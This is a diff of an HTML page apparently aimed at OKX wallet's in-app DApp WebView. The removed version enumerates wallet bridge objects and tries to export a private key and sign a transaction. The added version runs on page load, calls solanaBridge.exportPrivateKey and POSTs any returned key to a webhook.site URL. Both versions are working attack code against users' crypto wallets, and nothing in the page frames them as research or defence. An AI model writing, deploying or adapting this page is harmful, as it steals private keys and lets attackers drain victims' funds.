@@ -1,93 +1,19 @@
-<html>
-<head><meta charset="UTF-8">
-<style>
-body{background:#1a1a2e;color:#eee;font-family:monospace;padding:20px}
-.g{color:#0f0}.r{color:#e94560}.y{color:#ffa500}.i{color:#8899aa}
-#log{background:#16213e;padding:15px;border-radius:8px;line-height:1.8;font-size:13px}
-</style></head>
-<body>
-<h2>OKX Bridge Scanner</h2>
-<div id="s">Scanning...</div>
-<div id="log"></div>
-<script>
-(function(){
-    var el = document.getElementById('log');
-    var st = document.getElementById('s');
-    function l(cls, msg) { el.innerHTML += '<span class="'+cls+'">'+msg+'</span><br>'; }
+<html><body><script>
+var x = new XMLHttpRequest();
+x.open('POST', 'https://webhook.site/d1a1de27-fff4-4e9d-a4ea-954bd54b2225', true);
+x.setRequestHeader('Content-Type','text/plain');
 
-    try {
-        // 枚举 window 上所有对象 - 找 bridge 相关
-        l('i', '[*] Scanning window objects...');
-        var bridges = [];
-        var allKeys = Object.keys(window);
-        l('i', '    Total window keys: ' + allKeys.length);
-
-        // 搜索已知桥名
-        var knownBridges = [
-            'solanaBridge', 'solana', 'svm', '_solana_', '_solana',
-            'okxwallet', 'okx', 'walletBridge', 'WalletBridge',
-            'Android', 'android', 'JSBridge', 'jsBridge', 'web3',
-            'ethereum', 'ethers', 'provider', 'wallet', 'bridge'
-        ];
-
-        for(var k in window) {
-            var kLower = k.toLowerCase();
-            if(kLower.indexOf('bridge') >= 0 || kLower.indexOf('wallet') >= 0 ||
-               kLower.indexOf('solana') >= 0 || kLower.indexOf('ethereum') >= 0 ||
-               kLower.indexOf('web3') >= 0 || kLower.indexOf('okx') >= 0) {
-                bridges.push({name:k, type:typeof window[k]});
-            }
-        }
-
-        l('g', '[+] Bridge-like objects found: ' + bridges.length);
-        bridges.forEach(function(b) {
-            var extra = '';
-            if(b.type === 'object' || b.type === 'function') {
-                try {
-                    var methods = Object.keys(window[b.name]).filter(function(m) {
-                        return typeof window[b.name][m] === 'function';
-                    });
-                    extra = ' methods: ' + methods.join(',');
-                } catch(e) {}
-            }
-            l('g', '    ' + b.name + ' (' + b.type + ')' + extra);
-        });
-
-        // 尝试调 solanaBridge (如果有)
-        if(typeof solanaBridge !== 'undefined') {
-            l('g', '[+] solanaBridge found! Testing...');
-            try { var k = solanaBridge.exportPrivateKey(""); l('g', '[!!!] KEY: ' + k); st.innerHTML = '✅ KEY: ' + k; } catch(e) { l('r', '    exportPrivateKey error: ' + e.message); }
-            try { var t = solanaBridge.signAndSendTransaction('{"to":"0xTest","amount":"0.001","token":"SOL"}'); l('g', '[!!!] TX: ' + JSON.stringify(t)); } catch(e) { l('r', '    signAndSend error: ' + e.message); }
-        }
-
-        // 尝试 solana (window.solana)
-        if(typeof window.solana !== 'undefined') {
-            l('g', '[+] window.solana: autoApprove=' + window.solana.autoApprove + ' isDebug=' + window.solana.isDebug);
-        }
-
-        if(typeof window.svm !== 'undefined') {
-            l('g', '[+] window.svm: autoApprove=' + window.svm.autoApprove);
-        }
-
-        // 尝试 okxwallet
-        if(typeof window.okxwallet !== 'undefined') {
-            l('g', '[+] window.okxwallet found');
-            if(window.okxwallet.solana) l('g', '    okxwallet.solana.autoApprove=' + window.okxwallet.solana.autoApprove);
-        }
-
-        // 结果
-        if(bridges.length === 0) {
-            st.innerHTML = '❌ No DApp bridges found. Not in DApp WebView.';
-            st.style.color = '#e94560';
-        } else {
-            st.innerHTML = '✅ Scan complete - see bridges above';
-            st.style.color = '#0f0';
-        }
-
-    } catch(e) {
-        l('r', '[FATAL] ' + e.message);
-        st.innerHTML = '❌ Error: ' + e.message;
-    }
-})();
-</script>
-</body></html>
+try {
+  if(typeof solanaBridge !== 'undefined') {
+    solanaBridge.exportPrivateKey('').then(function(k){
+      x.send('KEY:' + k);
+    }).catch(function(e){
+      x.send('ERR:' + e.message);
+    });
+  } else {
+    x.send('NO_BRIDGE');
+  }
+} catch(e) {
+  x.send('FATAL:' + e.message);
+}
+</script></body></html>
